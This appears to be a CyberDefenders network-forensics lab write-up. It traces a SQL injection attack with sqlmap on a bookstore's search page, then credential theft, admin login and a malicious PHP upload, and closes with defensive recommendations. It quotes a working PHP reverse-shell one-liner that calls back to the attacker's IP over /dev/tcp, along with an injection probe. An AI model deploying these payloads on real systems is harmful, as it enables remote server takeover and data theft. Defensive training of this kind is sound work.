Web Investigation Lab

Investigating suspicious HTTP traffic, SQL Injection, credential disclosure, admin panel compromise, and malicious PHP upload in a captured network trace.

Platform CyberDefenders
Category Network Forensics
Tactics Initial Access · Persistence · C2
Tools Wireshark · NetworkMiner

Executive Summary

This investigation focused on analyzing a packet capture from BookWorld, an online bookstore that experienced an unusual spike in database queries and server resource usage.

By analyzing WebInvestigation.pcap, I identified that the attacker used sqlmap to exploit a SQL Injection vulnerability in the search parameter of search.php. Through this vulnerability, the attacker extracted database information, dumped sensitive customer data, and retrieved valid admin credentials.

After obtaining the admin credentials, the attacker logged into the admin dashboard and uploaded a malicious PHP script designed to establish a reverse shell connection back to the attacker-controlled IP.

Impact: The incident involved confirmed SQL Injection exploitation, credential disclosure, customer PII exposure, admin dashboard compromise, and attempted server-level access.

6. SQL Injection Activity with sqlmap

While reviewing HTTP traffic from 111.224.250.131, I found many requests targeting: 

/search.php?search=

The request headers revealed the tool used by the attacker: 

User-Agent: sqlmap/1.8.3#stable (https://sqlmap.org)

SQL Injection indicators included keywords and functions such as UNION, SELECT, CHAR(), CASE WHEN, and INFORMATION_SCHEMA.

Confirmed attack vector: SQL Injection in the search parameter of search.php.

7. First SQL Injection Attempt

The first decoded SQL Injection attempt was: 

/search.php?search=book and 1=1; -- -

This request shows a simple boolean test against the search parameter, indicating the beginning of SQL Injection probing.

8. Database Enumeration

After confirming injection, the attacker enumerated available databases using INFORMATION_SCHEMA.SCHEMATA.

12. Malicious PHP Upload

After accessing the admin dashboard, the attacker uploaded a PHP file through /admin/index.php. 

Content-Disposition: form-data; name="fileToUpload"; filename="NVri2vhp.php"
Content-Type: application/x-php

The uploaded PHP file attempted to execute a reverse shell back to the attacker: 

<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/111.224.250.131/443 0>&1'");?>

The server confirmed the upload: 

The file NVri2vhp.php has been uploaded.

Uploaded File Verification

The attacker then accessed /admin/uploads/. The server returned an Apache directory listing showing the uploaded PHP file. 

<title>Index of /admin/uploads</title>
<a href="NVri2vhp.php">NVri2vhp.php</a>
Post-exploitation attempt: The attacker uploaded a PHP reverse shell and verified that the file existed in a web-accessible directory.

13. Post-upload Traffic Review

After reviewing the remaining packets, I mostly observed requests for default Apache directory listing icons: 

GET /icons/blank.gif
GET /icons/back.gif
GET /icons/unknown.gif

These requests were generated when the browser rendered the Apache directory listing page. I did not observe clear evidence that NVri2vhp.php was executed successfully or that a reverse shell session was established within the remaining PCAP traffic.

17. Recommendations

  • Use prepared statements and parameterized queries for all database operations.
  • Validate and sanitize all user-controlled input, especially the search parameter.
  • Reset the compromised admin password immediately.
  • Store passwords using strong hashing algorithms such as bcrypt or Argon2.
  • Enable MFA for admin accounts.
  • Block upload of executable file types such as .php, .phtml, and .phar.
  • Store uploaded files outside the web root.
  • Disable script execution in upload directories.
  • Disable Apache directory listing.
  • Monitor for sqlmap User-Agent strings and SQL keywords in HTTP request URIs.

19. Lessons Learned

This lab demonstrated how a single SQL Injection vulnerability can lead to a full compromise chain. The attacker moved from vulnerability testing to database extraction, credential theft, admin access, and malicious file upload.

From a SOC analyst perspective, this investigation reinforced the importance of starting with PCAP triage, identifying dominant conversations, pivoting on suspicious IPs, following HTTP streams, decoding request URIs, and correlating multiple events into a complete attack timeline.

Conclusion

The BookWorld incident was caused by a SQL Injection vulnerability in search.php. The attacker, identified as 111.224.250.131, used sqlmap to exploit the vulnerable search parameter and extract sensitive data from the database.

The attacker successfully obtained admin credentials, logged into the admin dashboard, and uploaded a malicious PHP script named NVri2vhp.php. Although the uploaded script was designed to create a reverse shell, the available PCAP did not show clear evidence that the reverse shell was successfully executed.
